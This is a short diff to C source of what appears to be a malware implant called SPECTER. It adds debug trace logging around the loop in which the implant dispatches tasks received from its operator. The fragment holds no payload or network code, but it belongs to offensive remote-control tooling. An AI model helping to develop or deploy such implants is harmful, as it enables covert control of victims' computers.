@@ -593,7 +593,10 @@ static void implant_main_loop(PVOID param) {
         if (g_ctx.pending_task_count > 0) {
             DEV_TRACE_VAL("[SPECTER] tasks received", g_ctx.pending_task_count);
             for (DWORD ti = 0; ti < g_ctx.pending_task_count; ti++) {
+                DEV_TRACE_VAL("[SPECTER] dispatch task index", ti);
+                DEV_TRACE_VAL("[SPECTER] dispatch task type", g_ctx.pending_tasks[ti].task_type);
                 execute_task(&g_ctx, &g_ctx.pending_tasks[ti]);
+                DEV_TRACE_VAL("[SPECTER] dispatch result_count", g_ctx.task_result_count);
             }
             /* Free task data buffers and reset count */
             task_free_pending(&g_ctx);
